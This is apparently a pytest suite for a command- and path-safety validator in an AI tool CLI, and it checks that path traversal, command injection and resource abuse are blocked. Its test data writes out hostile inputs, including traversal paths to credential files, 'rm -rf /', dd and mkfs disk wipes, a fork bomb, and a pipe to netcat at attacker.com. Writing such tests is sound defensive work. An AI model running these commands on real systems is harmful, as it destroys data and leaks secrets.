"""Security attack vector tests for SafetyValidator (T117).

Tests protection against real-world attack patterns:
- Path traversal attacks (OWASP A01:2021)
- Command injection attacks (OWASP A03:2021)
- Resource exhaustion attacks (OWASP A04:2021)
- Privilege escalation attempts

These tests validate that SafetyValidator blocks all known attack vectors
and handles edge cases securely.
"""

import pytest
from pathlib import Path

from promptchain.cli.tools.safety import SafetyValidator, SecurityError


class TestPathTraversalAttacks:
    """Test protection against path traversal attacks (OWASP A01:2021)."""

    def test_block_parent_directory_traversal(self, tmp_path):
        """Test that ../ path traversal is blocked."""
        validator = SafetyValidator(project_root=tmp_path)

        traversal_attempts = [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "data/../../../etc/passwd",
            "./../../etc/passwd",
        ]

        for attempt in traversal_attempts:
            with pytest.raises(SecurityError) as exc_info:
                validator.validate_path(attempt)

            assert exc_info.value.severity == "critical"
            assert "escapes project root" in str(exc_info.value).lower()

    def test_block_absolute_path_escape(self, tmp_path):
        """Test that absolute paths outside project root are blocked."""
        validator = SafetyValidator(project_root=tmp_path)

        dangerous_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/root/.ssh/id_rsa",
            "/var/log/auth.log",
            "/home/other_user/.bashrc",
        ]

        for path in dangerous_paths:
            with pytest.raises(SecurityError) as exc_info:
                validator.validate_path(path)

            assert exc_info.value.severity == "critical"

    def test_block_null_byte_injection(self, tmp_path):
        """Test that null byte injection is blocked."""
        validator = SafetyValidator(project_root=tmp_path)

        null_byte_attempts = [
            "file.txt\x00../../etc/passwd",
            "safe.txt\x00",
            "\x00/etc/passwd",
        ]

        for attempt in null_byte_attempts:
            with pytest.raises(SecurityError) as exc_info:
                validator.validate_path(attempt)

            assert exc_info.value.severity == "critical"
            assert "null bytes" in str(exc_info.value).lower()

    def test_block_symlink_escape(self, tmp_path):
        """Test that symlinks pointing outside project root are blocked."""
        validator = SafetyValidator(project_root=tmp_path)

        # Create symlink to /etc
        symlink = tmp_path / "evil_link"
        try:
            symlink.symlink_to("/etc/passwd")
        except OSError:
            pytest.skip("Cannot create symlinks on this system")

        with pytest.raises(SecurityError) as exc_info:
            validator.validate_path(symlink)

        assert exc_info.value.severity in ("high", "critical")
        # Symlink should trigger path escape error
        assert "escapes project root" in str(exc_info.value).lower()

    def test_block_write_to_system_directories(self, tmp_path):
        """Test that write access to system directories is blocked."""
        validator = SafetyValidator(project_root=Path("/"))

        system_dirs = [
            "/etc/malware.conf",
            "/bin/evil",
            "/usr/bin/backdoor",
            "/var/log/modified.log",
            "/root/compromised",
        ]

        for path in system_dirs:
            with pytest.raises(SecurityError) as exc_info:
                validator.validate_path(path, allow_write=True)

            assert exc_info.value.severity == "critical"
            assert "system directory" in str(exc_info.value).lower()


class TestCommandInjectionAttacks:
    """Test protection against command injection (OWASP A03:2021)."""

    def test_block_rm_rf_slash(self, tmp_path):
        """Test that 'rm -rf /' is blocked."""
        validator = SafetyValidator(project_root=tmp_path)

        dangerous_rm_commands = [
            ["rm", "-rf", "/"],
            ["rm", "-rf", "/*"],
            ["rm", "-rf", "/home"],
        ]

        for cmd in dangerous_rm_commands:
            with pytest.raises(SecurityError) as exc_info:
                validator.validate_command(cmd)

            assert exc_info.value.severity == "critical"
            assert "dangerous" in str(exc_info.value).lower()

    def test_block_dd_device_overwrite(self, tmp_path):
        """Test that dd device overwrite commands are blocked."""
        validator = SafetyValidator(project_root=tmp_path)

        dd_attacks = [
            ["dd", "if=/dev/zero", "of=/dev/sda"],
            ["dd", "if=/dev/urandom", "of=/dev/sda1"],
        ]

        for cmd in dd_attacks:
            with pytest.raises(SecurityError) as exc_info:
                validator.validate_command(cmd)

            assert exc_info.value.severity == "critical"

    def test_block_fork_bomb(self, tmp_path):
        """Test that fork bomb is blocked."""
        validator = SafetyValidator(project_root=tmp_path)

        with pytest.raises(SecurityError) as exc_info:
            validator.validate_command(["bash", "-c", ":(){ :|:& };:"])

        assert exc_info.value.severity == "critical"

    def test_block_mkfs_commands(self, tmp_path):
        """Test that filesystem format commands are blocked."""
        validator = SafetyValidator(project_root=tmp_path)

        mkfs_commands = [
            ["mkfs.ext4", "/dev/sda1"],
            ["mkfs", "/dev/sdb"],
        ]

        for cmd in mkfs_commands:
            with pytest.raises(SecurityError) as exc_info:
                validator.validate_command(cmd)

            assert exc_info.value.severity == "critical"

    def test_block_shell_metacharacters_in_args(self, tmp_path):
        """Test that shell metacharacters in arguments are blocked."""
        validator = SafetyValidator(project_root=tmp_path)

        injection_attempts = [
            ["ls", "; rm -rf /"],
            ["cat", "file.txt | nc attacker.com 1234"],
            ["echo", "data && cat /etc/passwd"],
            ["grep", "pattern `whoami`"],
            ["find", ". -exec rm {} \\;"],
        ]

        for cmd in injection_attempts:
            with pytest.raises(SecurityError) as exc_info:
                validator.validate_command(cmd)

            assert exc_info.value.severity in ("high", "critical")
            # Should be blocked for dangerous command or metacharacter
            assert any(keyword in str(exc_info.value).lower() for keyword in ["metacharacter", "dangerous"])

    def test_block_dangerous_permission_changes(self, tmp_path):
        """Test that dangerous permission changes are blocked."""
        validator = SafetyValidator(project_root=tmp_path)

        permission_attacks = [
            ["chmod", "-R", "777", "/"],
            ["chown", "-R", "nobody", "/"],
        ]

        for cmd in permission_attacks:
            with pytest.raises(SecurityError) as exc_info:
                validator.validate_command(cmd)

            assert exc_info.value.severity == "critical"


class TestResourceExhaustionAttacks:
    """Test protection against resource exhaustion (OWASP A04:2021)."""

    def test_block_oversized_files(self, tmp_path):
        """Test that oversized files are blocked."""
        # Use very low limit for testing
        validator = SafetyValidator(
            project_root=tmp_path,
            max_file_size=1024,  # 1KB
        )

        # Create oversized file (10KB)
        huge_file = tmp_path / "huge.txt"
        huge_file.write_bytes(b"x" * 10240)

        with pytest.raises(SecurityError) as exc_info:
            validator.validate_file_size(huge_file)

        assert exc_info.value.severity == "medium"
        assert "exceeds size limit" in str(exc_info.value).lower()

    def test_block_excessive_timeout(self, tmp_path):
        """Test that excessive timeouts are blocked."""
        validator = SafetyValidator(
            project_root=tmp_path,
            max_timeout=60,
        )

        with pytest.raises(SecurityError) as exc_info:
            validator.validate_operation(
                operation="shell.execute",
                command=["ls", "-la"],  # Use safe command
                timeout=3600,  # 1 hour - too long
            )

        assert exc_info.value.severity in ("medium", "high")
        assert "timeout exceeds" in str(exc_info.value).lower()

    def test_block_oversized_write_content(self, tmp_path):
        """Test that oversized write content is blocked."""
        validator = SafetyValidator(
            project_root=tmp_path,
            max_file_size=1024,  # 1KB
        )

        # Try to write 10KB of data
        huge_content = "x" * 10240

        with pytest.raises(SecurityError) as exc_info:
            validator.validate_operation(
                operation="fs.write",
                path="output.txt",
                content=huge_content,
            )

        assert exc_info.value.severity == "medium"


class TestPrivilegeEscalationAttempts:
    """Test protection against privilege escalation attempts."""

    def test_block_project_root_deletion(self, tmp_path):
        """Test that deleting project root is blocked."""
        validator = SafetyValidator(project_root=tmp_path)

        with pytest.raises(SecurityError) as exc_info:
            validator.validate_operation(
                operation="fs.delete",
                path=tmp_path,
                confirmed=True,
            )

        assert exc_info.value.severity == "critical"
        assert "project root" in str(exc_info.value).lower()

    def test_block_important_file_deletion_safe_mode(self, tmp_path):
        """Test that important files are protected in safe mode."""
        safe_validator = SafetyValidator(project_root=tmp_path, safe_mode=True)

        # Create .git directory
        git_dir = tmp_path / ".git"
        git_dir.mkdir()

        with pytest.raises(SecurityError) as exc_info:
            safe_validator.validate_operation(
                operation="fs.delete",
                path=".git",
                confirmed=True,
            )

        assert exc_info.value.severity == "high"
        assert "important file" in str(exc_info.value).lower()

    def test_allow_important_file_deletion_unsafe_mode(self, tmp_path):
        """Test that important files can be deleted in unsafe mode."""
        unsafe_validator = SafetyValidator(project_root=tmp_path, safe_mode=False)

        # Create .git directory
        git_dir = tmp_path / ".git"
        git_dir.mkdir()

        # Should not raise in unsafe mode
        validated = unsafe_validator.validate_operation(
            operation="fs.delete",
            path=".git",
            confirmed=True,
        )

        assert validated["path"] == git_dir


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_unicode_path_handling(self, tmp_path):
        """Test that Unicode paths are handled correctly."""
        validator = SafetyValidator(project_root=tmp_path)

        # Create file with Unicode name
        unicode_file = tmp_path / "测试文件.txt"
        unicode_file.write_text("content")

        # Should validate successfully
        validated = validator.validate_path("测试文件.txt", must_exist=True)
        assert validated == unicode_file

    def test_spaces_in_path(self, tmp_path):
        """Test that paths with spaces are handled correctly."""
        validator = SafetyValidator(project_root=tmp_path)

        # Create file with spaces
        spaced_file = tmp_path / "test file with spaces.txt"
        spaced_file.write_text("content")

        validated = validator.validate_path("test file with spaces.txt", must_exist=True)
        assert validated == spaced_file

    def test_case_sensitivity(self, tmp_path):
        """Test case sensitivity in path validation."""
        validator = SafetyValidator(project_root=tmp_path)

        # Create file
        test_file = tmp_path / "Test.txt"
        test_file.write_text("content")

        # Path matching should be case-sensitive on most systems
        # (but may vary by OS)
        try:
            validator.validate_path("test.txt", must_exist=True)
        except SecurityError:
            # Expected on case-sensitive filesystems
            pass

    def test_relative_path_normalization(self, tmp_path):
        """Test that relative paths are normalized correctly."""
        validator = SafetyValidator(project_root=tmp_path)

        # Create nested file
        nested = tmp_path / "a" / "b" / "c.txt"
        nested.parent.mkdir(parents=True)
        nested.write_text("content")

        # Various equivalent paths
        paths = [
            "a/b/c.txt",
            "./a/b/c.txt",
            "a/./b/c.txt",
            "a/b/./c.txt",
        ]

        for path in paths:
            validated = validator.validate_path(path, must_exist=True)
            assert validated == nested

    def test_empty_path_handling(self, tmp_path):
        """Test handling of empty path."""
        validator = SafetyValidator(project_root=tmp_path)

        # Empty string should resolve to project root
        validated = validator.validate_path("")
        assert validated == tmp_path


class TestDefenseInDepth:
    """Test defense-in-depth principles."""

    def test_multiple_validation_layers(self, tmp_path):
        """Test that multiple validation layers work together."""
        validator = SafetyValidator(
            project_root=tmp_path,
            safe_mode=True,
            max_file_size=1024,
        )

        # Create file that's too large
        large_file = tmp_path / "large.sh"  # Dangerous extension
        large_file.write_bytes(b"x" * 2048)

        # Should fail on multiple checks
        with pytest.raises(SecurityError):
            # File size check
            validator.validate_file_size(large_file)

        with pytest.raises(SecurityError):
            # Extension check
            validator.validate_file_extension(large_file, "execute")

    def test_fail_secure_on_error(self, tmp_path):
        """Test that validation fails securely on errors."""
        validator = SafetyValidator(project_root=tmp_path)

        # Test with invalid input types
        with pytest.raises((SecurityError, TypeError, ValueError)):
            validator.validate_path(None)

        with pytest.raises((SecurityError, TypeError, ValueError)):
            validator.validate_command(None)


class TestPerformance:
    """Test validation performance requirements (<10ms overhead).

    Note: Full benchmark tests require pytest-benchmark plugin.
    These tests verify performance manually using time measurements.
    """

    def test_path_validation_performance(self, tmp_path):
        """Test that path validation is fast (<10ms)."""
        import time

        validator = SafetyValidator(project_root=tmp_path)

        test_file = tmp_path / "test.txt"
        test_file.write_text("content")

        # Measure validation time
        start = time.perf_counter()
        for _ in range(100):  # Run 100 times
            result = validator.validate_path("test.txt", must_exist=True)
        elapsed = time.perf_counter() - start

        # Average should be well under 10ms (0.01s)
        avg_time = elapsed / 100
        assert avg_time < 0.01, f"Path validation took {avg_time*1000:.2f}ms (should be <10ms)"
        assert result == test_file

    def test_command_validation_performance(self, tmp_path):
        """Test that command validation is fast (<10ms)."""
        import time

        validator = SafetyValidator(project_root=tmp_path)

        # Measure validation time
        start = time.perf_counter()
        for _ in range(100):
            validator.validate_command(["ls", "-la"])
        elapsed = time.perf_counter() - start

        # Average should be well under 10ms
        avg_time = elapsed / 100
        assert avg_time < 0.01, f"Command validation took {avg_time*1000:.2f}ms (should be <10ms)"

    def test_operation_validation_performance(self, tmp_path):
        """Test that full operation validation is fast (<10ms)."""
        import time

        validator = SafetyValidator(project_root=tmp_path)

        test_file = tmp_path / "test.txt"
        test_file.write_text("content")

        # Measure validation time
        start = time.perf_counter()
        for _ in range(100):
            result = validator.validate_operation(
                operation="fs.read",
                path="test.txt",
            )
        elapsed = time.perf_counter() - start

        # Average should be well under 10ms
        avg_time = elapsed / 100
        assert avg_time < 0.01, f"Operation validation took {avg_time*1000:.2f}ms (should be <10ms)"
        assert result["path"] == test_file


class TestOWASPCompliance:
    """Test OWASP Top 10 2021 compliance."""

    def test_a01_broken_access_control(self, tmp_path):
        """Test A01:2021 - Broken Access Control prevention."""
        validator = SafetyValidator(project_root=tmp_path)

        # Directory traversal prevention
        with pytest.raises(SecurityError):
            validator.validate_path("../../../etc/passwd")

        # System directory write prevention
        validator_root = SafetyValidator(project_root=Path("/"))
        with pytest.raises(SecurityError):
            validator_root.validate_path("/etc/test", allow_write=True)

    def test_a03_injection(self, tmp_path):
        """Test A03:2021 - Injection prevention."""
        validator = SafetyValidator(project_root=tmp_path)

        # Command injection prevention
        with pytest.raises(SecurityError):
            validator.validate_command(["ls", "; rm -rf /"])

        # Null byte injection prevention
        with pytest.raises(SecurityError):
            validator.validate_path("file.txt\x00../../etc/passwd")

    def test_a04_insecure_design(self, tmp_path):
        """Test A04:2021 - Insecure Design prevention."""
        validator = SafetyValidator(
            project_root=tmp_path,
            max_file_size=1024,
            max_timeout=60,
        )

        # Resource limits enforced
        large_file = tmp_path / "large.txt"
        large_file.write_bytes(b"x" * 2048)

        with pytest.raises(SecurityError):
            validator.validate_file_size(large_file)

        # Timeout limits enforced
        with pytest.raises(SecurityError):
            validator.validate_operation(
                operation="shell.execute",
                command=["sleep", "1"],
                timeout=120,
            )

    def test_a05_security_misconfiguration(self, tmp_path):
        """Test A05:2021 - Security Misconfiguration prevention."""
        validator = SafetyValidator(project_root=tmp_path)

        # Safe defaults (safe_mode=True by default)
        assert validator.safe_mode is True

        # shell=True blocked
        with pytest.raises(SecurityError):
            validator.validate_operation(
                operation="shell.execute",
                command=["ls"],
                shell=True,
            )
